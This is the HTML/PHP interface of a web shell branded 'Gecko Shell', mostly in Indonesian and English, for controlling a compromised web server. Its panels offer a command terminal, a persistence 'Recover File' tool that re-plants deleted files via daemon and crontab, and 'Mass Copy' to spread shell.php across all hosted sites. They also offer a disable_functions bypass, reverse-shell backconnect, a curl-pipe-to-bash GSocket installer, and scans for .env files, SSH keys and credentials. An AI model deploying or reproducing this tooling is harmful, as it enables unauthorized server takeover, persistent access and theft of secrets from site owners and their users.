    <div class="panel" id="panel">
      <div class="empty" id="loading">
        <div class="empty-ico"><svg class="spin" viewBox="0 0 16 16"><path d="M8 0a8 8 0 0 1 8 8h-1.5A6.5 6.5 0 0 0 8 1.5V0Z" fill="currentColor"/></svg></div>
        <h3>Loading workspace…</h3>
        <p>Fetching your files</p>
      </div>
    </div>

    <div class="statusbar" id="statusbar">
      <div class="pulse-dot"></div>
      <span id="stItems">—</span>
      <span id="stDisk">—</span>
      <span id="stClock">—</span>
      <span class="st-right st-path-copy" id="stPath" title="Click to copy path">—</span>
    </div>
  </main>
</div></div><div class="overlay" id="mCreate">
  <div class="modal m-sm">
    <div class="modal-head"><h2 id="createTitle">New File</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="fg"><label>Name</label><input type="text" id="createName" placeholder="filename.ext"></div>
      <div class="fg hidden" id="createContentWrap"><label>Initial content (optional)</label><textarea id="createContent" rows="4"></textarea></div>
    </div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="createOk">Create</button></div>
  </div>
</div>

<div class="overlay" id="mRename">
  <div class="modal m-sm">
    <div class="modal-head"><h2>Rename</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body"><div class="fg"><label>New name</label><input type="text" id="renameInput"></div></div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="renameOk">Rename</button></div>
  </div>
</div>

<div class="overlay" id="mChmod">
  <div class="modal m-sm">
    <div class="modal-head"><h2>Permissions (Chmod)</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="fg">
        <label>Izin Oktal (contoh: 0755, 0644)</label>
        <input type="text" id="chmodInput" placeholder="0644" maxlength="4">
      </div>
    </div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="chmodOk">Apply</button></div>
  </div>
</div>

<div class="overlay" id="mDelete">
  <div class="modal m-sm">
    <div class="modal-head"><h2>Delete</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body"><p id="deleteMsg" style="color:var(--tx2);font-size:14px;line-height:1.6"></p></div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-danger" id="deleteOk">Delete</button></div>
  </div>
</div>

<div class="overlay" id="mTransfer">
  <div class="modal m-sm tool-modal">
    <div class="modal-head"><h2 id="transferTitle">Copy to folder</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <p id="transferMsg" style="color:var(--tx2);font-size:13px;line-height:1.5;margin-bottom:12px"></p>
      <div class="fg"><label>Destination folder</label><input type="text" id="transferDest" placeholder="C:/path/to/folder"></div>
    </div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="transferOk">Confirm</button></div>
  </div>
</div>

<div class="overlay" id="mZip">
  <div class="modal m-sm tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">📦</span>Compress to ZIP</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <p id="zipMsg" style="color:var(--tx2);font-size:13px;line-height:1.5;margin-bottom:12px"></p>
      <div class="fg"><label>Archive name</label><input type="text" id="zipName" placeholder="archive.zip"></div>
      <div class="fg"><label>Save in folder</label><input type="text" id="zipDest" placeholder="Current folder"></div>
    </div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="zipOk">Create ZIP</button></div>
  </div>
</div>

<div class="overlay" id="mUpload">
  <div class="modal m-md">
    <div class="modal-head"><h2>Upload Files</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="dropzone" id="dropzone">
        <svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.25 3.25a.75.75 0 0 1-1.06 0L3.53 7.28a.75.75 0 0 1 1.06-1.06l2.66 2.347Z"/></svg>
        <p>Drag &amp; drop files here or <strong>click to browse</strong></p>
        <p style="font-size:11px;margin-top:6px;color:var(--tx4)">Uploads to current folder</p>
        <p style="font-size:10px;margin-top:4px;color:var(--tx4)">Max file size: <?php echo ini_get('upload_max_filesize'); ?></p>
      </div>
      <input type="file" id="fileInput" multiple class="hidden">
    </div>
  </div>
</div>

<div class="overlay" id="mEditor">
  <div class="modal m-full">
    <div class="modal-head">
      <span class="ed-unsaved-dot" id="edUnsaved" title="Unsaved changes"></span>
      <h2 id="edTitle">Edit File</h2>
      <span class="path-tag" id="edPath"></span>
      <button class="btn btn-ghost btn-sm" id="edWrapToggle" title="Toggle word wrap">Wrap</button>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
      <div class="editor-wrap">
        <div class="line-nums" id="lineNums"></div>
        <div class="ed-area" id="edArea">
          <pre class="ed-highlight" id="edHighlight" aria-hidden="true"></pre>
          <textarea id="edText" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
        </div>
      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="edMeta"></span>
      <button class="btn mc">Cancel</button>
      <button class="btn btn-primary" id="edSave">
        <svg viewBox="0 0 16 16"><path d="M2.75 1A1.75 1.75 0 0 0 1 2.75v10.5c0 .966.784 1.75 1.75 1.75h10.5A1.75 1.75 0 0 0 15 13.25V2.75A1.75 1.75 0 0 0 13.25 1H2.75ZM3.5 6.25V2.5h4.75v3.75H3.5Zm9 7.25H3.5V9.5h9v4Z"/></svg>
        Save
      </button>
    </div>
  </div>
</div>

<div class="overlay" id="mImagePreview">
  <div class="modal m-lg">
    <div class="modal-head">
      <h2 id="ipTitle">Preview</h2>
      <span class="path-tag" id="ipPath"></span>
      <div class="ip-tabs" role="tablist">
        <button class="ip-tab active" data-tab="image" type="button">Image</button>
        <button class="ip-tab" data-tab="text" type="button">Text</button>
      </div>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body" style="padding:14px">
      <div class="ip-pane ip-image" id="ipImagePane">
        <img id="ipImg" alt="">
        <div class="img-info" id="ipImgInfo"></div>
      </div>
      <div class="ip-pane ip-text hidden" id="ipTextPane">
        <pre id="ipTextContent">Loading…</pre>
      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="ipMeta"></span>
      <button class="btn mc">Close</button>
      <a class="btn btn-primary" id="ipDownload" download>
        <svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.25 3.25a.75.75 0 0 1-1.06 0L3.53 7.28a.75.75 0 0 1 1.06-1.06l2.66 2.347Z"/></svg>
        Download
      </a>
    </div>
  </div>
</div>

<div class="overlay term-modal" id="mTerm">
  <div class="modal m-lg" style="height:78vh">
    <div class="modal-head">
      <h2>Terminal</h2>
      <span class="path-tag" id="termPathTag">root</span>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body">
      <div class="term-top">
        <div class="term-dots" aria-hidden="true"><i></i><i></i><i></i></div>
        <div class="term-title-area">
          <div class="term-title">
            <svg class="term-title-icon" viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 8l4 4-4 4"/><path d="M12 16h7"/></svg>
            Gecko Shell
          </div>
          <div class="term-cwd" id="termCwd">~</div>
        </div>
        <div class="term-actions">
          <span class="term-stats" id="termStats" title="Commands executed"><b id="termCount">0</b><span>cmds</span></span>
          <button class="term-btn" id="termCopy" title="Copy all output">
            <svg viewBox="0 0 16 16"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/></svg>
          </button>
          <button class="term-btn" id="termClear" title="Clear (Ctrl+L)">
            <svg viewBox="0 0 16 16"><path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.75 1.75 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15ZM6.5 1.75V3h3V1.75a.25.25 0 0 0-.25-.25h-2.5a.25.25 0 0 0-.25.25Z"/></svg>
          </button>
        </div>
      </div>
      <div class="term-out" id="termOut"></div>
      <div class="term-in-row">
        <div class="term-prompt-area">
          <span class="term-prompt-user">gecko</span><span class="term-prompt-at">@</span><span class="term-prompt-host">shell</span><span class="term-prompt-colon">:</span><span class="term-prompt-cwd" id="termPromptCwd">~</span>
          <span class="term-prompt-mark">❯</span>
        </div>
        <input type="text" id="termIn" placeholder="Type a command…" autocomplete="off" spellcheck="false">
        <div class="term-spinner" id="termSpinner" aria-hidden="true"></div>
        <div class="term-hint">
          <span><span class="kbd">↑↓</span>history</span>
          <span><span class="kbd">⏎</span>run</span>
        </div>
      </div>
    </div>
  </div>
</div>

<div class="overlay" id="mCron">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">⏰</span>Cron Manager</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="sec-callout" id="cronPlatformNote">Loading crontab…</div>
      <div class="fg" style="margin-top:14px"><label>Crontab entries</label><textarea id="cronContent" rows="14" spellcheck="false" placeholder="* * * * * /usr/bin/php /path/to/script.php"></textarea></div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-ghost" id="cronReload">Reload</button>
      <button class="btn btn-primary" id="cronSave">Save Crontab</button>
    </div>
  </div>
</div>

<div class="overlay" id="mRecover">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">♻️</span>Recover File</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="sec-callout">Created By <code>Major0xPusdiklat</code>: Recover Files + auto persistence (daemon/crontab/tmp/shm)</div>
      <div class="tool-grid" style="margin-top:14px">
        <div class="fg span2"><label>DIR_PATH</label><input type="text" id="recDirPath" placeholder="/var/www/html" autocomplete="off" title="Otomatis terisi path browse saat ini; bisa diubah manual"></div>
        <div class="fg"><label>FILE_NAME</label><input type="text" id="recFileName" placeholder="index.php" autocomplete="off"></div>
        <div class="fg span2"><label>DOWNLOAD_URL</label><input type="url" id="recDownloadUrl" placeholder="https://paste.ee/r/xxxx" autocomplete="off"></div>
        <div class="fg span2">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="checkbox" id="recPersist" checked style="width:auto;margin:0">
            Enable auto-recover (daemon + crontab + /tmp + /dev/shm) — file yang dihapus akan kembali
          </label>
        </div>
      </div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — recover</span></div>
        <div class="tool-output tall empty sec-terminal-out" id="recOutput">Isi DIR_PATH, FILE_NAME, DOWNLOAD_URL lalu klik Recover.</div>
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="recRun">Recover</button>
    </div>
  </div>
</div>

<div class="overlay" id="mFindWritable">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">📂</span>Find Writable Dir</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="sec-callout">Cari direktori yang <code>is_writable</code>. Kosongkan path untuk pakai lokasi browse saat ini (atau default <code>/var/www/html</code>).</div>
      <div class="tool-grid" style="margin-top:14px">
        <div class="fg span2"><label>Start path (opsional)</label><input type="text" id="fwPath" placeholder="/var/www/html" autocomplete="off"></div>
        <div class="fg"><label>Max depth</label><input type="number" id="fwDepth" value="8" min="0" max="12"></div>
        <div class="fg"><label>Limit results</label><input type="number" id="fwLimit" value="400" min="1" max="500"></div>
      </div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — find writable</span></div>
        <div class="tool-output tall empty sec-terminal-out" id="fwOutput">Klik Find untuk mulai scan.</div>
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-ghost" id="fwUseCurrent">Use Current Path</button>
      <button class="btn btn-primary" id="fwRun">Find</button>
    </div>
  </div>
</div>

<div class="overlay" id="mMassCopy">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">📑</span>Mass Copy</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="sec-callout">Mode <b>eksklusif</b> (hanya satu aktif). v1: Base Path + writable dalam (depth≥2). v2: discovery Symlink. v3: Apache/Nginx sites-enabled (ServerName+DocumentRoot, HTTP+SSL dedupe). <b>Validasi sama:</b> copy → hapus .htaccess → path/url VALID|INVALID.</div>
      <div class="tool-grid" style="margin-top:14px">
        <div class="fg span2"><label>Source File</label><input type="text" id="mcSrc" placeholder="/home/user/public_html/shell.php" autocomplete="off"></div>
        <div class="fg span2" id="mcBaseWrap"><label>Base Path (domain source)</label><input type="text" id="mcBase" placeholder="/home/* atau /home/username" autocomplete="off"></div>
        <div class="fg span2">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="checkbox" id="mcV2" style="width:auto;margin:0">
            Mass Copy v2 — auto discovery user/domain (tanpa Base Path)
          </label>
        </div>
        <div class="fg span2">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="checkbox" id="mcV3" style="width:auto;margin:0">
            Mass Copy v3 — Apache/Nginx sites-enabled (DocumentRoot, anti-duplikat SSL)
          </label>
        </div>
        <div class="fg span2">
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="checkbox" id="mcDebug" style="width:auto;margin:0">
            Debug mode (tampilkan log detail)
          </label>
        </div>
      </div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — mass copy</span><span class="sec-terminal-meta" id="mcMeta">—</span></div>
        <div class="tool-output tall empty sec-terminal-out" id="mcOutput">Isi Source File + Base Path lalu klik Spread.</div>
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-ghost" id="mcCopyUrls" title="Copy confirmed URLs">Copy URLs</button>
      <button class="btn btn-ghost" id="mcDownloadTxt" title="Download confirmed URLs as TXT">Download TXT</button>
      <button class="btn btn-primary" id="mcRun">Spread</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBypassDf">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">🛡️</span>Bypass Functions</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="sec-callout">LD_PRELOAD + <code>mail()</code> untuk menjalankan perintah saat <code>disable_functions</code> memblokir shell. Payload .so sudah embedded di <code>manager.php</code> — tidak perlu <code>preload.php</code> terpisah. Linux only.</div>
      <div class="tool-grid" style="margin-top:14px">
        <div class="fg span2"><label>Command</label><input type="text" id="bpCmd" placeholder="uname -a" value="uname -a" autocomplete="off"></div>
      </div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — bypass functions</span><span class="sec-terminal-meta" id="bpMeta">—</span></div>
        <div class="tool-output tall empty sec-terminal-out" id="bpOutput">Klik Check Status atau Run Command.</div>
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-ghost" id="bpCheck">Check Status</button>
      <button class="btn btn-primary" id="bpRun">Run Command</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBackconnect">
  <div class="modal m-md tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">🔗</span>Backconnect</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg"><label>Your IP / Host</label><input type="text" id="bcIp" placeholder="192.168.1.100"></div>
        <div class="fg"><label>Port</label><input type="number" id="bcPort" value="4444" min="1" max="65535"></div>
        <div class="fg span2"><label>Method</label>
          <select id="bcMethod">
            <option value="bash">Bash (/dev/tcp)</option>
            <option value="nc">Netcat (nc)</option>
            <option value="python">Python</option>
            <option value="perl">Perl</option>
            <option value="php">PHP</option>
            <option value="powershell">PowerShell (Windows)</option>
          </select>
        </div>
      </div>
      <div class="sec-callout warn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span>Start listener dulu: <code>nc -lvnp PORT</code> atau <code>rlwrap nc -lvnp PORT</code></span></div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — backconnect</span></div>
        <div class="tool-output empty sec-terminal-out" id="bcOutput">Ready — connection runs in background.</div>
      </div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="bcStart">Start Backconnect</button>
    </div>
  </div>
</div>

<div class="overlay" id="mGsocket">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">⚡</span>GSocket</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg span2"><label>Download method</label>
          <select id="gsMethod">
            <option value="curl">curl — GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk …)"</option>
            <option value="wget">wget — GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate …)"</option>
          </select>
        </div>
      </div>
      <div class="tool-cmd" id="gsCmdPreview">GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"</div>
      <div class="sec-callout"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span>Installer dari gsocket.io/y. Jika GSRN firewalled, otomatis retry <code>GS_PORT=22</code> s/d <code>67</code>.</span></div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — gsocket</span></div>
        <div class="tool-output tall empty sec-terminal-out" id="gsOutput">Klik Run untuk mengeksekusi installer GSocket.</div>
      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="gsMeta">—</span>
      <button class="btn btn-ghost" id="gsCopy" title="Copy output">Copy Output</button>
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="gsRun">Run GSocket</button>
    </div>
  </div>
</div>

<div class="overlay" id="mPortScan">
  <div class="modal m-lg tool-modal">
    <div class="modal-head"><h2><span class="tool-head-ico">🌐</span>Port Scanner</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg"><label>Target Host</label><input type="text" id="psHost" value="127.0.0.1" placeholder="127.0.0.1"></div>
        <div class="fg"><label>Ports</label><input type="text" id="psPorts" value="21,22,25,80,443,3306,8080" placeholder="22,80,443 or 1-1024"></div>
        <div class="fg"><label>Timeout (sec)</label><input type="number" id="psTimeout" value="1" min="1" max="5"></div>
      </div>
      <div class="sec-terminal" style="margin-top:14px">
        <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — port scan</span></div>
        <div class="tool-output empty sec-terminal-out" id="psOutput">Enter target and click Scan.</div>
      </div>
      <div class="tool-tags" id="psTags"></div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="psScan">Scan Ports</button>
    </div>
  </div>
</div>

<div class="overlay" id="mAdminer">
  <div class="modal m-full tool-modal">
    <div class="modal-head">
      <h2><span class="tool-head-ico">🗄</span>Adminer (DB Manager)</h2>
      <button class="btn btn-ghost btn-sm" id="dbOpenAdminer" title="Open full Adminer">Full Adminer ↗</button>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg"><label>Type</label>
          <select id="dbType">
            <option value="mysql">MySQL</option>
            <option value="pgsql">PostgreSQL</option>
            <option value="sqlite">SQLite</option>
          </select>
        </div>
        <div class="fg"><label>Host</label><input type="text" id="dbHost" value="127.0.0.1"></div>
        <div class="fg"><label>Port</label><input type="number" id="dbPort" value="3306"></div>
        <div class="fg"><label>User</label><input type="text" id="dbUser" value="root"></div>
        <div class="fg"><label>Password</label><input type="password" id="dbPass" autocomplete="off"></div>
        <div class="fg"><label>Database</label><input type="text" id="dbName" placeholder="database name"></div>
      </div>
      <div class="db-tables" id="dbTables"></div>
      <div class="fg" style="margin-top:14px"><label>SQL Query</label><textarea id="dbSql" rows="5" spellcheck="false" placeholder="SELECT * FROM users LIMIT 10;"></textarea></div>
      <div id="dbResult"></div>
    </div>
    <div class="modal-foot">
      <span class="left" id="dbMeta">Built-in PDO query runner</span>
      <button class="btn btn-ghost" id="dbTablesBtn">List Tables</button>
      <button class="btn btn-primary" id="dbRun">Run Query</button>
    </div>
  </div>
</div>

<div class="overlay" id="mSecHub">
  <div class="modal m-full sec-hub-modal">
    <div class="modal-head sec-hub-head">
      <div class="sec-hub-head-left">
        <span class="sec-hub-badge">OFFSEC</span>
        <h2>Cyber Security Hub</h2>
      </div>
      <button class="btn btn-ghost btn-sm" id="secPhpinfo" title="Open PHPInfo">PHPInfo ↗</button>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body sec-hub-body">
      <div class="sec-hub-shell">
        <nav class="sec-hub-nav" role="tablist">
          <button class="sec-nav-btn active" data-sec="recon" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg></span><span class="sec-nav-text"><strong>Recon</strong><small>System intel</small></span></button>
          <button class="sec-nav-btn" data-sec="sensitive" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 11v6M9 14h6"/></svg></span><span class="sec-nav-text"><strong>Sensitive</strong><small>Secret files</small></span></button>
          <button class="sec-nav-btn" data-sec="processes" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9z"/></svg></span><span class="sec-nav-text"><strong>Processes</strong><small>Running tasks</small></span></button>
          <button class="sec-nav-btn" data-sec="network" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M2 12h20M12 2a15 15 0 0 1 0 20M12 2a15 15 0 0 0 0 20"/></svg></span><span class="sec-nav-text"><strong>Network</strong><small>Ports &amp; ifaces</small></span></button>
          <button class="sec-nav-btn" data-sec="http" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></span><span class="sec-nav-text"><strong>HTTP</strong><small>Request client</small></span></button>
          <button class="sec-nav-btn" data-sec="hash" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M4 9h16M4 15h16M10 3L8 21M16 3l-2 18"/></svg></span><span class="sec-nav-text"><strong>Hash</strong><small>Checksums</small></span></button>
          <button class="sec-nav-btn" data-sec="codec" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></span><span class="sec-nav-text"><strong>Codec</strong><small>Encode/decode</small></span></button>
          <button class="sec-nav-btn" data-sec="dns" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20z"/><path d="M2 12h20M12 2v20"/></svg></span><span class="sec-nav-text"><strong>DNS</strong><small>Record lookup</small></span></button>
          <button class="sec-nav-btn" data-sec="privesc" type="button"><span class="sec-nav-ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4M12 16h.01"/></svg></span><span class="sec-nav-text"><strong>Privesc</strong><small>Linux &amp; Windows</small></span></button>
        </nav>
        <div class="sec-hub-main">
          <div class="sec-hero">
            <h3 id="secHeroTitle">System Recon</h3>
            <p id="secHeroDesc">Informasi sistem, user/privilege, batasan PHP, kernel &amp; environment.</p>
          </div>
          <div class="sec-hub-content">

        <div class="sec-panel active" data-panel="recon">
          <div class="sec-panel-card">
            <div class="sec-actions">
              <button class="btn btn-primary btn-sm" id="secRunRecon">Run System Recon</button>
              <button class="btn btn-ghost btn-sm" id="secCopyRecon">Copy Report</button>
            </div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — recon</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutRecon">System info, user/privilege, PHP security restrictions, kernel &amp; env.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="sensitive">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="secSensPath" placeholder="Kosongkan = base + direktori umum"></div>
            </div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunSensitive">Scan Sensitive Files</button></div>
            <div class="sec-callout"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg><span>Mencari <code>.env</code>, <code>wp-config</code>, SSH keys, <code>.git/config</code>, SQL dumps, credentials…</span></div>
            <div class="sec-terminal" style="margin-top:14px">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — sensitive scan</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutSensitive">Klik Scan untuk mulai pencarian.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="processes">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunProcesses">List Processes</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — processes</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutProcesses">ps aux / tasklist output.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="network">
          <div class="sec-panel-card">
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunNetwork">Show Network</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — network</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutNetwork">Listening ports, connections, interfaces.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="http">
          <div class="sec-panel-card">
            <div class="sec-form-grid">
              <div class="fg span2"><label>URL</label><input type="text" id="secHttpUrl" placeholder="https://example.com/api"></div>
              <div class="fg"><label>Method</label>
                <select id="secHttpMethod"><option>GET</option><option>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option><option>HEAD</option></select>
              </div>
              <div class="fg span2"><label>Headers (one per line)</label><textarea id="secHttpHeaders" rows="2" placeholder="User-Agent: GeckoSec&#10;Accept: */*"></textarea></div>
              <div class="fg span2"><label>Body</label><textarea id="secHttpBody" rows="3" placeholder="POST body…"></textarea></div>
            </div>
            <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunHttp">Send Request</button></div>
            <div class="sec-terminal">
              <div class="sec-terminal-bar"><div class="sec-terminal-dots"><i></i><i></i><i></i></div><span class="sec-terminal-title">output — http</span></div>
              <div class="tool-output tall empty sec-terminal-out" id="secOutHttp">HTTP client untuk SSRF / recon testing.</div>
            </div>
          </div>
        </div>

        <div class="sec-panel" data-panel="hash">
          <div class="sec-panel-card">
